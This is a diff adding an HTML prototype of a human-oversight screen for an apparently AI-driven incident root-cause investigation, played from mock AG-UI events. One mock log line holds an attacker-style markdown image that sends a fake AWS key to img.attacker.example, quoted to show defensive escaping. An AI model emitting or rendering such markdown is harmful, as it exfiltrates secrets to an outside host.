@@ -1,0 +1,703 @@
+<!doctype html>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Investigation Screen Prototype</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<!--
+  PROTOTYPE — throwaway. Branch prototype/ag-ui-screen only; never merge to main.
+  Question: "What does the human see during an Investigation?" (Wayfinder ticket: AG-UI screen prototype)
+  Three structurally different layouts of the ONE Investigation screen, switchable from the bottom bar (or ← →):
+    A = Cockpit (context rail | stage timeline | stage panel)
+    B = Feed (one chronological stream, cards inline)
+    C = Report-first (live RCA report document + evidence drawer)
+  All data is a mock AG-UI event stream played in the browser. No backend. Event shapes approximate AG-UI 1.0.
+  Model/log text is ALWAYS rendered as plain text; links only to allowlisted hosts; no images ever load.
+-->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap">
+<style>
+/* Layout: ops console — dense, scan-first; status encoded by colour stripe + pill, accent only for "your turn" */
+:root{
+  --bg:#eef1f4; --panel:#ffffff; --sunk:#f6f8fa; --ink:#16202b; --muted:#5a6673; --line:#d6dce3;
+  --accent:#2a55c0; --accent-ink:#ffffff; --accent-soft:#e3eafb;
+  --ok:#1d7a4c; --ok-soft:#e1f2e8; --warn:#9a5b00; --warn-soft:#fbefd9; --bad:#b42318; --bad-soft:#fbe4e1; --idle:#8b96a3;
+  --f-body:"Public Sans",system-ui,-apple-system,"Segoe UI",sans-serif; --f-mono:"JetBrains Mono",ui-monospace,Menlo,Consolas,monospace;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#0e1318; --panel:#161d24; --sunk:#11171d; --ink:#e4e9ef; --muted:#93a0ad; --line:#29323c;
+  --accent:#7ea2ff; --accent-ink:#0e1318; --accent-soft:#1d2a47;
+  --ok:#4cc38a; --ok-soft:#173326; --warn:#f0a742; --warn-soft:#3a2a10; --bad:#ff7a6e; --bad-soft:#3d1a17; --idle:#5f6b78; color-scheme:dark}}
+:root[data-theme="dark"]{
+  --bg:#0e1318; --panel:#161d24; --sunk:#11171d; --ink:#e4e9ef; --muted:#93a0ad; --line:#29323c;
+  --accent:#7ea2ff; --accent-ink:#0e1318; --accent-soft:#1d2a47;
+  --ok:#4cc38a; --ok-soft:#173326; --warn:#f0a742; --warn-soft:#3a2a10; --bad:#ff7a6e; --bad-soft:#3d1a17; --idle:#5f6b78; color-scheme:dark}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--ink);font:14px/1.45 var(--f-body);padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));padding-block:12px 120px}
+h1,h2,h3{margin:0;text-wrap:balance}
+h1{font-size:17px;font-weight:700}
+h2{font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--muted)}
+h3{font-size:15px;font-weight:600}
+button{font:inherit;cursor:pointer;border:1px solid var(--line);background:var(--panel);color:var(--ink);border-radius:6px;padding:5px 10px}
+button:hover{border-color:var(--accent)}
+button:focus-visible,textarea:focus-visible,input:focus-visible,select:focus-visible,a:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+button.primary{background:var(--accent);color:var(--accent-ink);border-color:var(--accent);font-weight:600}
+button.danger{color:var(--bad)}
+button:disabled{opacity:.45;cursor:not-allowed}
+textarea,input[type=text],select{font:inherit;color:var(--ink);background:var(--sunk);border:1px solid var(--line);border-radius:6px;padding:6px 8px;width:100%}
+textarea{min-height:54px;resize:vertical}
+a{color:var(--accent)}
+.mono{font-family:var(--f-mono);font-size:12px}
+.muted{color:var(--muted)}
+.row{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.stack{display:flex;flex-direction:column;gap:8px}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:12px;min-width:0}
+.pill{display:inline-flex;align-items:center;gap:4px;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;padding:2px 7px;border-radius:99px;background:var(--sunk);color:var(--muted);border:1px solid var(--line);white-space:nowrap}
+.pill.ok{background:var(--ok-soft);color:var(--ok);border-color:transparent}
+.pill.warn{background:var(--warn-soft);color:var(--warn);border-color:transparent}
+.pill.bad{background:var(--bad-soft);color:var(--bad);border-color:transparent}
+.pill.you{background:var(--accent);color:var(--accent-ink);border-color:transparent}
+.pill.run{background:var(--accent-soft);color:var(--accent);border-color:transparent}
+.chip{font-family:var(--f-mono);font-size:11px;padding:1px 6px;border-radius:4px;background:var(--sunk);border:1px solid var(--line);color:var(--ink);white-space:nowrap}
+button.chip{padding:1px 6px;border-radius:4px}
+.cite{display:flex;gap:6px;align-items:baseline;flex-wrap:wrap;font-size:12px}
+.blocked{font-family:var(--f-mono);font-size:11px;color:var(--warn);background:var(--warn-soft);padding:0 4px;border-radius:3px;word-break:break-all}
+.quote{font-family:var(--f-mono);font-size:12px;background:var(--sunk);border:1px dashed var(--line);padding:6px 8px;border-radius:6px;white-space:pre-wrap;word-break:break-word}
+.finding{border-top:1px solid var(--line);padding:8px 0;display:flex;flex-direction:column;gap:4px}
+.finding:first-child{border-top:0}
+.finding.sel{background:var(--accent-soft);margin:0 -8px;padding:8px}
+.fid{font-family:var(--f-mono);font-size:11px;font-weight:600;color:var(--muted)}
+.gap{color:var(--warn);font-size:12px}
+.dot{width:10px;height:10px;border-radius:50%;background:var(--idle);flex:none}
+.dot.running{background:var(--accent);animation:pulse 1.2s infinite}
+.dot.done{background:var(--ok)}.dot.incomplete{background:var(--warn)}.dot.stalled{background:var(--bad)}
+.dot.waiting{background:var(--accent);box-shadow:0 0 0 3px var(--accent-soft)}.dot.skipped{background:transparent;border:2px solid var(--idle)}
+@keyframes pulse{50%{opacity:.35}}
+@media (prefers-reduced-motion:reduce){.dot.running{animation:none}}
+.act{font-family:var(--f-mono);font-size:12px;color:var(--muted);display:flex;gap:6px}
+.act b{color:var(--ink);font-weight:600}
+.conf{font-size:11px;font-weight:700;text-transform:uppercase;padding:1px 6px;border-radius:4px}
+.conf.high{background:var(--ok-soft);color:var(--ok)}.conf.medium{background:var(--warn-soft);color:var(--warn)}.conf.low{background:var(--sunk);color:var(--muted);border:1px solid var(--line)}
+.bar{height:6px;background:var(--sunk);border-radius:3px;overflow:hidden;border:1px solid var(--line)}
+.bar>i{display:block;height:100%;background:var(--ok)}
+details>summary{cursor:pointer;color:var(--muted);font-size:12px}
+table{border-collapse:collapse;width:100%;font-size:12px}
+th,td{text-align:left;padding:4px 6px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-size:11px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+.tablewrap{overflow-x:auto}
+.diff{font-family:var(--f-mono);font-size:12px;background:var(--sunk);border-radius:6px;padding:6px 8px;white-space:pre;overflow-x:auto}
+.diff .add{color:var(--ok)}.diff .del{color:var(--bad)}
+/* interrupt card */
+.icard{border:2px solid var(--accent);border-radius:10px;background:var(--panel);padding:14px;display:flex;flex-direction:column;gap:10px;min-width:0}
+.icard .ihead{display:flex;justify-content:space-between;gap:8px;align-items:flex-start;flex-wrap:wrap}
+.icard .choices{display:flex;flex-wrap:wrap;gap:6px}
+.icard .choice{border:1px solid var(--line);border-radius:8px;padding:8px 10px;text-align:left;display:flex;flex-direction:column;gap:2px;flex:1 1 170px;min-width:0}
+.icard .choice small{color:var(--muted);font-size:11px}
+.icard .choice.on{border-color:var(--accent);background:var(--accent-soft)}
+.icard .choice.primary-choice{border-color:var(--accent)}
+.banner{border-radius:8px;padding:8px 10px;font-size:13px}
+.banner.warn{background:var(--warn-soft);color:var(--warn)}
+.banner.bad{background:var(--bad-soft);color:var(--bad)}
+.banner.ok{background:var(--ok-soft);color:var(--ok)}
+.kv{display:grid;grid-template-columns:max-content 1fr;gap:3px 10px;font-size:13px}
+.kv dt{color:var(--muted)} .kv dd{margin:0;min-width:0;word-break:break-word}
+/* header */
+.top{display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:10px}
+/* ---------- Variant A: cockpit ---------- */
+.A{display:grid;grid-template-columns:250px minmax(250px,320px) minmax(0,1fr);gap:10px;align-items:start}
+.A .tl{display:flex;flex-direction:column}
+.A .tlrow{display:flex;gap:8px;align-items:flex-start;padding:8px;border-radius:6px;cursor:pointer;border:1px solid transparent;text-align:left;background:none;width:100%}
+.A .tlrow:hover{background:var(--sunk)}
+.A .tlrow.sel{background:var(--accent-soft);border-color:var(--accent)}
+.A .tlrow .t{display:flex;flex-direction:column;gap:2px;min-width:0}
+.A .tabs{display:flex;gap:4px;border-bottom:1px solid var(--line);margin-bottom:8px;flex-wrap:wrap}
+.A .tabs button{border:0;border-bottom:2px solid transparent;border-radius:0;background:none;padding:6px 10px;color:var(--muted)}
+.A .tabs button.on{border-bottom-color:var(--accent);color:var(--ink);font-weight:600}
+@media (max-width:980px){.A{grid-template-columns:1fr}}
+/* ---------- Variant B: feed ---------- */
+.B{max-width:820px;margin:0 auto;display:flex;flex-direction:column;gap:10px}
+.B .stepper{position:sticky;top:env(safe-area-inset-top,0px);z-index:5;background:var(--bg);padding:6px 0;display:flex;gap:4px;flex-wrap:wrap}
+.B .sh{display:flex;gap:8px;align-items:center;margin-top:6px}
+.B .entry{margin-left:18px;border-left:2px solid var(--line);padding-left:12px;display:flex;flex-direction:column;gap:6px}
+/* ---------- Variant C: report-first ---------- */
+.C{display:grid;grid-template-columns:minmax(0,1fr) 340px;gap:10px;align-items:start}
+.C .stepper{grid-column:1/-1;display:flex;gap:0;overflow-x:auto;background:var(--panel);border:1px solid var(--line);border-radius:8px}
+.C .step{flex:1 0 auto;padding:8px 10px;display:flex;gap:6px;align-items:center;font-size:12px;border-right:1px solid var(--line);white-space:nowrap}
+.C .step:last-child{border-right:0}
+.C .step.cur{background:var(--accent-soft);font-weight:600}
+.C .ticker{grid-column:1/-1;font-family:var(--f-mono);font-size:12px;color:var(--muted);padding:2px 4px}
+.C .doc{max-width:760px}
+.C .doc section{display:flex;flex-direction:column;gap:6px;padding:10px 0;border-top:1px solid var(--line)}
+.C .doc section:first-child{border-top:0}
+.C .pending{color:var(--idle);font-style:italic}
+.C .drawer{position:sticky;top:8px;max-height:calc(100vh - 140px);overflow:auto}
+.C .sheet{grid-column:1/-1;position:sticky;bottom:64px;z-index:6;box-shadow:0 -6px 24px rgba(0,0,0,.18);border-radius:10px}
+@media (max-width:980px){.C{grid-template-columns:1fr}.C .drawer{position:static;max-height:none}}
+/* ---------- prototype chrome (not part of the design) ---------- */
+.proto{position:fixed;left:50%;transform:translateX(-50%);bottom:calc(10px + env(safe-area-inset-bottom,0px));z-index:50;background:#111;color:#f2f2f2;border-radius:14px;padding:6px 8px;display:flex;gap:6px;align-items:center;flex-wrap:wrap;justify-content:center;box-shadow:0 6px 24px rgba(0,0,0,.35);max-width:calc(100vw - 24px);font-size:12px}
+.proto button{background:#2a2a2a;color:#f2f2f2;border:1px solid #444;padding:3px 8px;border-radius:8px;font-size:12px}
+.proto button.on{background:#f2f2f2;color:#111}
+.proto .lbl{font-weight:700;padding:0 4px}
+.proto .sep{width:1px;height:18px;background:#444}
+.log{position:fixed;right:max(12px,env(safe-area-inset-right,0px));bottom:calc(70px + env(safe-area-inset-bottom,0px));width:min(520px,calc(100vw - 24px));max-height:46vh;overflow:auto;z-index:49;background:#111;color:#cfd8e3;font:11px/1.5 var(--f-mono);border-radius:10px;padding:8px;box-shadow:0 6px 24px rgba(0,0,0,.35)}
+.log div{white-space:pre-wrap;word-break:break-all;border-bottom:1px solid #222;padding:2px 0}
+.log .out{color:#ffd479}
+.protonote{font-size:11px;color:var(--muted);margin-bottom:8px}
+</style>
+
+<div class="protonote">PROTOTYPE · mock AG-UI events, no backend · switch layouts in the black bar (or ← →)</div>
+<div id="app"></div>
+<div id="log" class="log" hidden></div>
+<div class="proto" id="proto"></div>
+
+<script>
+"use strict";
+/* ================= safe rendering ================= */
+// Every interpolation is escaped unless wrapped in raw(). Model output, log lines, answers: always text.
+const RAW = Symbol("raw");
+const raw = s => ({[RAW]: s});
+const esc = v => String(v ?? "").replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
+const h = (strs, ...vals) => raw(strs.reduce((o, s, i) => o + s + (i < vals.length ? emit(vals[i]) : ""), ""));
+const emit = v => v == null || v === false ? "" : Array.isArray(v) ? v.map(emit).join("") : (v && v[RAW] !== undefined) ? v[RAW] : esc(v);
+// Link allowlist: only our own deep links (Observability backend + source control of registered repos).
+const ALLOW = [{host:"grafana.testbed.local"}, {host:"github.com", path:"/rca-testbed/"}];
+function link(url, label){
+  let u; try { u = new URL(url); } catch { return h`<span class="blocked" title="Not a URL">${url}</span>`; }
+  const ok = u.protocol === "https:" && ALLOW.some(a => u.hostname === a.host && (!a.path || u.pathname.startsWith(a.path)));
+  return ok ? h`<a href="${u.href}" target="_blank" rel="noopener noreferrer">${label || u.href}</a>`
+            : h`<span class="blocked" title="Link not on allowlist: shown as text, never fetched">⚠ link not allowed: ${url}</span>`;
+}
+
+/* ================= mock domain data ================= */
+const GH = "https://github.com/rca-testbed";
+const GF = "https://grafana.testbed.local";
+const code = (repo, sha, path, l1, l2) => ({kind:"code", label:`${repo}@${sha}:${path}:${l1}-${l2}`, url:`${GH}/${repo}/blob/${sha}/${path}#L${l1}-L${l2}`});
+const q = (label, url) => ({kind:"query", label, url});
+const STAGES = [
+  ["prefetch","Pre-fetch"],["evidence","Evidence"],["change","Change"],["codeloc","Code-locator"],["rcawriter","RCA writer"],
+  ["rcagate","RCA gate"],["fixproposer","Fix proposer"],["fixgate","Fix gate"],["pr","Open draft PR"]
+];
+const GATES = {rcagate:1, fixgate:1};
+
+/* ================= state ================= */
+const S = {};
+function reset(){
+  Object.assign(S, {
+    variant: (location.hash.replace("#","")||"A").toUpperCase(),
+    status: "running", outcome: null, current: null, sel: null, tab: "findings", selFinding: null,
+    stages: Object.fromEntries(STAGES.map(([id]) => [id, {status:"pending", acts:[], v:1, collapsed:false}])),
+    agent: {findings:[], hypotheses:[], gaps:[], report:{}, superseded:[], pr:null, recovery:null, humanContext:[], questionsAsked:0},
+    reportStream: "", narr: "", interrupt: null, interruptAt: null, revisions: 0, fixRevisions: 0,
+    form: {}, thread: [], log: [], queue: [], playing: true, speed: 1, confirmCancel: false, stalledStage: null,
+  });
+  if (!"ABC".includes(S.variant)) S.variant = "A";
+}
+
+/* ================= tiny JSON-patch (add/replace) on S.agent ================= */
+function patch(ops){
+  for (const op of ops){
+    const parts = op.path.split("/").slice(1); let o = S.agent;
+    for (let i = 0; i < parts.length - 1; i++) o = o[parts[i]] ??= {};
+    const k = parts.at(-1);
+    if (Array.isArray(o) && k === "-") o.push(op.value); else o[k] = op.value;
+  }
+}
+
+/* ================= reducer: AG-UI events -> state ================= */
+function apply(ev){
+  S.log.push(ev);
+  switch(ev.type){
+    case "RUN_STARTED": S.status = "running"; break;
+    case "STEP_STARTED": { const st = S.stages[ev.stepName]; st.status = "running"; S.current = ev.stepName; if (!S.sel || S.stages[S.sel].status !== "waiting") S.sel = ev.stepName; break; }
+    case "STEP_FINISHED": { const st = S.stages[ev.stepName]; st.status = ev.incomplete ? "incomplete" : "done"; st.collapsed = true; break; }
+    case "TOOL_CALL_START": S.stages[S.current].acts.push({id:ev.toolCallId, name:ev.toolCallName, args:ev.args, res:null}); S.narr = `${ev.toolCallName}(${ev.args})`; break;
+    case "TOOL_CALL_RESULT": { const a = S.stages[S.current].acts.find(x => x.id === ev.toolCallId); if (a) a.res = ev.content; break; }
+    case "TEXT_MESSAGE_CONTENT": if (ev.messageId.startsWith("report")) S.reportStream += ev.delta; else S.narr = ev.delta; break;
+    case "STATE_DELTA": patch(ev.delta); break;
+    case "RUN_FINISHED":
+      if (ev.outcome === "interrupt"){
+        S.interrupt = ev.interrupt; S.interruptAt = Date.now(); S.form = {};
+        const r = ev.interrupt.reason;
+        S.status = r === "rca_gate" ? "awaiting_rca_gate" : r === "fix_gate" ? "awaiting_fix_gate" : r === "recovery_approval" ? "awaiting_recovery_approval" : "awaiting_answer";
+        if (r === "rca_gate"){ S.stages.rcagate.status = "waiting"; S.sel = "rcagate"; }
+        if (r === "fix_gate"){ S.stages.fixgate.status = "waiting"; S.sel = "fixgate"; }
+        S.playing = false;
+      } else { S.status = "ended"; S.outcome = ev.result; S.narr = ""; }
+      break;
+  }
+}
+function clientSend(msg){ S.log.push({dir:"out", ...msg}); }
+
+/* ================= scripted segments (mock backend) ================= */
+let tc = 0;
+const tool = (name, args, content, d=450) => [{d, ev:{type:"TOOL_CALL_START", toolCallId:"tc"+(++tc), toolCallName:name, args}}, {d, ev:{type:"TOOL_CALL_RESULT", toolCallId:"tc"+tc, content}}];
+const find = f => ({d:300, ev:{type:"STATE_DELTA", delta:[{op:"add", path:"/findings/-", value:f}]}});
+const say = t => ({d:250, ev:{type:"TEXT_MESSAGE_CONTENT", messageId:"narr", delta:t}});
+const start = s => ({d:350, ev:{type:"STEP_STARTED", stepName:s}});
+const fin = (s, incomplete) => ({d:350, ev:{type:"STEP_FINISHED", stepName:s, incomplete}});
+const intr = (reason, payload, schema) => ({d:400, ev:{type:"RUN_FINISHED", threadId:"inv-0142", outcome:"interrupt", interrupt:{id:"int-"+reason+"-"+(++tc), reason, payload, responseSchema:schema}}});
+const resumeRun = () => ({d:200, ev:{type:"RUN_STARTED", threadId:"inv-0142", runId:"run-"+(++tc)}});
+
+const SEG = {
+  prefetch: () => [
+    {d:200, ev:{type:"RUN_STARTED", threadId:"inv-0142", runId:"run-1"}},
+    start("prefetch"), say("Gathering alert details, error patterns, key metrics and recent changes (no model)"),
+    ...tool("observability.parseAlert", "alertmanager:OrdersApiHighErrorRate", "orders-service, prod-testbed, firing 14:09Z"),
+    find({id:"F1", stage:"prefetch", claim:"OrdersApiHighErrorRate firing since 14:09Z: 5xx ratio on POST /orders is 23% (threshold 5%).", cites:[q("PromQL 5xx ratio, 13:30–14:30Z", `${GF}/explore?q=orders_5xx_ratio`)]}),
+    ...tool("observability.logDigest", "orders-service 13:50–14:20Z", "3 patterns"),
+    find({id:"F2", stage:"prefetch", claim:"Log digest: 1,842 × ReadTimeoutException calling inventory-service, first seen 14:03Z, none before.", cites:[q("Loki pattern, orders-service 13:50–14:20Z", `${GF}/explore?q=ReadTimeoutException`)]}),
+    ...tool("observability.queryMetrics", "inventory p99 latency", "p99 2.1s (was 1.4s)"),
+    find({id:"F3", stage:"prefetch", claim:"inventory-service p99 latency rose from 1.4 s to 2.1 s at 13:55Z; its error rate stayed flat.", cites:[q("PromQL http_server p99, inventory-service", `${GF}/explore?q=inventory_p99`)]}),
+    ...tool("sourceControl.recentChanges", "orders-service, inventory-service, http-commons since 12:00Z", "2 deployments"),
+    fin("prefetch"),
+  ],
+  evidence1: () => [
+    start("evidence"), say("Checking traces for the failing calls"),
+    ...tool("observability.searchTraces", "service=orders-service status=error 14:03–14:20Z", "212 traces"),
+    find({id:"F4", stage:"evidence", claim:"Failing traces all end in GET inventory-service/stock after exactly 2.0 s (client-side timeout), while the server span completes in 2.1–2.4 s.", cites:[q("Tempo trace 7f3a…e19", `${GF}/explore?trace=7f3ae19`)]}),
+    ...tool("observability.queryLogs", "orders-service level=ERROR sample 20", "20 lines"),
+    find({id:"F5", stage:"evidence", claim:"Sample error line quoted from the logs (contains attacker-style markdown; shown as text, nothing fetched):",
+      quote:"2026-11-06T14:04:11Z ERROR o.e.orders.InventoryClient - stock lookup failed: Read timed out ![status](https://img.attacker.example/p.png?d=AKIAEXAMPLE) see [runbook](https://bit.ly/3xYzA)",
+      cites:[q("Loki log line 14:04:11Z", `${GF}/explore?q=line_140411`), {kind:"query", label:"Elastic doc (no deep link available)", url:null}]}),
+    say("Latency rose on inventory-service but nothing was deployed there. Asking the Operator."),
+    intr("human_question", {kind:"multiple_choice", n:1, max:2, stage:"Evidence",
+      question:"Was a load test or planned traffic event running against inventory-service between 13:50 and 14:30 UTC?",
+      why:"inventory-service latency rose ~50% (F3) with no deployment on it; a known load event would explain F3 without a code cause.",
+      options:["No, nothing planned","Yes, a load test","Yes, a marketing/traffic event","I don't know"]},
+      {type:"object", properties:{choice:{type:"string"}, note:{type:"string"}}}),
+  ],
+  evidence2: () => [ resumeRun(), say("Answer recorded. Continuing Evidence."),
+    ...tool("observability.queryMetrics", "inventory request rate", "+35% from 13:50Z"),
+    find({id:"F6", stage:"evidence", claim:"inventory-service request rate up 35% from 13:50Z, matching the Operator's answer about a load test.", cites:[q("PromQL rate(http_server_requests)", `${GF}/explore?q=inventory_rate`)]}),
+    {d:300, ev:{type:"STATE_DELTA", delta:[{op:"add", path:"/gaps/-", value:{stage:"Evidence", text:"Budget hit before checking DB metrics of inventory-service (connection pool); not examined."}}]}},
+    fin("evidence", true),
+  ],
+  change: () => [ start("change"), say("Reading deployments and commits near 14:03Z"),
+    ...tool("sourceControl.deployments", "orders-service prod-testbed", "deploy 14:01Z sha 9f3c1e2"),
+    find({id:"F7", stage:"change", claim:"orders-service deployed 9f3c1e2 at 14:01Z, two minutes before the first timeout (F2).", cites:[q("GitHub deployment #311", `${GH}/orders-service/deployments`)]}),
+    ...tool("sourceControl.diff", "orders-service a71d0b4..9f3c1e2", "1 commit, 2 files"),
+    find({id:"F8", stage:"change", claim:"Commit 9f3c1e2 \"Tune HTTP client timeouts\" lowered inventory read-timeout from 5s to 2s (PR #482).", cites:[code("orders-service","9f3c1e2","src/main/resources/application.yml",41,44), q("PR #482", `${GH}/orders-service/pull/482`)]}),
+    fin("change"),
+  ],
+  codeloc: () => [ start("codeloc"), say("Mapping stack frames to code at the deployed commit"),
+    ...tool("code.grep", "orders-service@9f3c1e2 'inventory.client'", "3 hits"),
+    ...tool("code.read", "InventoryClient.java 50-90", "40 lines"),
+    find({id:"F9", stage:"codeloc", claim:"InventoryClient builds its RestClient with readTimeout from inventory.client.read-timeout and has no retry on read timeout.", cites:[code("orders-service","9f3c1e2","src/main/java/org/example/orders/InventoryClient.java",58,77)]}),
+    ...tool("code.read", "http-commons@1.8.2 TimeoutDefaults.java", "default 5s"),
+    find({id:"F10", stage:"codeloc", claim:"Shared library http-commons default read-timeout is 5s; orders-service overrides it.", cites:[code("http-commons","c41b9d0","src/main/java/org/example/http/TimeoutDefaults.java",12,18)]}),
+    fin("codeloc"),
+  ],
+  rca: v => {
+    const summary = v === 1
+      ? "Commit 9f3c1e2 lowered orders-service's read-timeout for inventory-service from 5 s to 2 s. A load test raised inventory p99 to 2.1 s at the same time, so calls now time out and POST /orders returns 500."
+      : "The 2 s read-timeout introduced in 9f3c1e2 is below inventory-service's p99 under the load test (2.1 s). Every call slower than 2 s fails with no retry, so ~23% of POST /orders return 500. Root cause: the timeout change; the load test only exposed it.";
+    const evs = [start("rcawriter"), say(v === 1 ? "Writing the RCA report from recorded Findings" : "Revising the RCA report with your feedback")];
+    for (const w of summary.match(/.{1,18}(\s|$)/g)) evs.push({d:90, ev:{type:"TEXT_MESSAGE_CONTENT", messageId:"report-"+v, delta:w}});
+    evs.push({d:300, ev:{type:"STATE_DELTA", delta:[
+      {op:"replace", path:"/hypotheses", value:[
+        {id:"H1", headline:"Read-timeout lowered to 2 s in 9f3c1e2 is below inventory p99 under load", confidence:"high", verified:5, total:5, repos:["orders-service","http-commons"], findings:["F2","F4","F7","F8","F9"], detail:"Timeline lines up to the minute; traces stop at exactly 2.0 s; reverting to the library default (5 s) covers the observed p99."},
+        {id:"H2", headline:"inventory-service DB connection pool saturated by the load test", confidence:"low", verified:1, total:3, repos:["inventory-service"], findings:["F3"], detail:"Would raise p99 too, but inventory error rate is flat and DB metrics were not examined (gap).", warn:"Rests on an unexamined gap"},
+      ]},
+      {op:"replace", path:"/report", value:{v, summary, primary:"H1", alternatives:["H2"],
+        timeline:[["13:50Z","Load test starts on inventory-service","F6"],["13:55Z","inventory p99 → 2.1 s","F3"],["14:01Z","orders-service deploys 9f3c1e2","F7"],["14:03Z","First ReadTimeoutException","F2"],["14:09Z","Alert fires","F1"]],
+        changes:[["9f3c1e2","Tune HTTP client timeouts (PR #482)","F8"]],
+        locations:[["F8","application.yml:41-44"],["F9","InventoryClient.java:58-77"]],
+        impact:"POST /orders and PUT /orders/{id} fail for ~23% of requests; checkout-web and mobile-bff see 500s.",
+        next:["Restore read-timeout ≥ inventory p99 (fix proposal)","Replay failed orders from orders.dlq (Recovery workflow)","Tell #checkout-oncall (Notification)"]}},
+    ]}});
+    evs.push(fin("rcawriter"));
+    evs.push(intr("rca_gate", {revision:S.revisions, maxRevisions:3}, {type:"object", properties:{decision:{enum:["approve_fix","accept_no_fix","revise","edit","abandon"]}, feedback:{type:"string"}}}));
+    return evs;
+  },
+  fix: v => [ resumeRun(), start("fixproposer"), say(v === 1 ? "Fix engine drafting a patch in the sandbox" : "Fix engine revising the patch"),
+    ...tool("fixEngine.propose", "orders-service base a71d0b4", "2 files changed"),
+    ...tool("checks.run", "applies, forbidden paths, secrets, size, banned libs", "all pass"),
+    ...tool("build.compile", "gradle :orders-service:compileJava", "environment error: private feed unreachable → partial compile"),
+    ...tool("build.test", "gradle test + regression test", "214 passed; regression: fail-before / pass-after"),
+    ...tool("impact.reach", "InventoryClient.getStock", "3 callers, 2 endpoints, 2 services"),
+    ...tool("fixReview.round", "round 1 of ≤2", "1 advisory point (cited)"),
+    fin("fixproposer"),
+    intr("fix_gate", {v}, {type:"object", properties:{decision:{enum:["approve","revise","reject","back_to_rca"]}, ack_partial_compile:{type:"boolean"}, feedback:{type:"string"}}}),
+  ],
+  pr: () => [ resumeRun(), start("pr"), say("Minting one-repo write token; opening draft PR as bot"),
+    ...tool("sourceControl.openDraftPr", "orders-service fix/inv-0142-read-timeout", "draft PR #489"),
+    {d:300, ev:{type:"STATE_DELTA", delta:[{op:"replace", path:"/pr", value:{label:"orders-service draft PR #489", url:`${GH}/orders-service/pull/489`}}]}},
+    fin("pr"),
+    say("RCA next step proposes a Recovery workflow; asking for its own approval"),
+    intr("recovery_approval", {}, {type:"object", properties:{decision:{enum:["approve","reject"]}, workflow:{type:"string"}, batch_size:{enum:["100","500","1000"]}, ack_non_idempotent:{type:"boolean"}}}),
+  ],
+  recoveryRun: () => [ resumeRun(), say("Dispatching replay-dead-letters.yml with a run-workflows token"),
+    {d:300, ev:{type:"STATE_DELTA", delta:[{op:"replace", path:"/recovery", value:{state:"queued"}}]}},
+    {d:900, ev:{type:"STATE_DELTA", delta:[{op:"replace", path:"/recovery/state", value:"in_progress"}]}},
+    {d:1400, ev:{type:"STATE_DELTA", delta:[{op:"replace", path:"/recovery/state", value:"success"}, {op:"replace", path:"/recovery/postcheck", value:"orders.dlq depth 0 after 6 min (pass)"}]}},
+    {d:400, ev:{type:"RUN_FINISHED", threadId:"inv-0142", outcome:"success", result:"RCA approved · draft PR opened · recovery run succeeded"}},
+  ],
+  endNoFix: why => [ resumeRun(), {d:300, ev:{type:"RUN_FINISHED", threadId:"inv-0142", outcome:"success", result:why}} ],
+};
+
+/* ================= player ================= */
+let timer = null;
+function enqueue(evs){ S.queue.push(...evs); pump(); }
+function pump(){
+  clearTimeout(timer);
+  if (!S.playing || !S.queue.length || S.stalledStage) return;
+  const {d} = S.queue[0];
+  timer = setTimeout(() => { const {ev} = S.queue.shift(); apply(ev); render(); pump(); }, d / S.speed);
+}
+function resume(payload){
+  const it = S.interrupt;
+  clientSend({type:"RunAgentInput", threadId:"inv-0142", resume:[{interruptId:it.id, payload}]});
+  S.interrupt = null; S.interruptAt = null; S.playing = true;
+  const r = it.reason;
+  if (r === "human_question"){ S.agent.questionsAsked++; enqueue(SEG.evidence2().concat(SEG.change(), SEG.codeloc(), SEG.rca(1))); }
+  if (r === "rca_gate"){
+    S.stages.rcagate.status = "done";
+    const d = payload.decision;
+    if (d === "approve_fix") enqueue(SEG.fix(1));
+    if (d === "accept_no_fix"){ ["fixproposer","fixgate","pr"].forEach(s => S.stages[s].status = "skipped"); enqueue(SEG.endNoFix("RCA accepted without a fix")); }
+    if (d === "abandon"){ ["fixproposer","fixgate","pr"].forEach(s => S.stages[s].status = "skipped"); enqueue(SEG.endNoFix("Abandoned at RCA gate")); }
+    if (d === "revise"){ S.revisions++; S.agent.superseded.push({v:S.agent.report.v, summary:S.agent.report.summary, feedback:payload.feedback}); S.reportStream = ""; S.stages.rcawriter.v++; S.stages.rcagate.status="pending"; enqueue([resumeRun(), ...SEG.rca(S.stages.rcawriter.v)]); }
+    if (d === "edit"){ S.agent.report.summary = payload.summary; S.agent.report.edited = true; S.reportStream = payload.summary; S.stages.rcagate.status="pending"; enqueue([resumeRun(), intr("rca_gate", {revision:S.revisions, maxRevisions:3}, {})]); }
+  }
+  if (r === "fix_gate"){
+    S.stages.fixgate.status = "done";
+    const d = payload.decision;
+    if (d === "approve") enqueue(SEG.pr());
+    if (d === "reject"){ S.stages.pr.status = "skipped"; enqueue(SEG.endNoFix("RCA approved · fix rejected")); }
+    if (d === "revise"){ S.fixRevisions++; S.stages.fixgate.status="pending"; S.stages.fixproposer.v++; enqueue(SEG.fix(S.stages.fixproposer.v)); }
+    if (d === "back_to_rca"){ S.stages.fixgate.status="pending"; S.stages.fixproposer.status="pending"; S.stages.rcagate.status="pending"; enqueue([resumeRun(), intr("rca_gate", {revision:S.revisions, maxRevisions:3}, {})]); }
+  }
+  if (r === "recovery_approval"){
+    if (payload.decision === "approve") enqueue(SEG.recoveryRun());
+    else enqueue(SEG.endNoFix("RCA approved · draft PR opened · recovery rejected"));
+  }
+  render();
+}
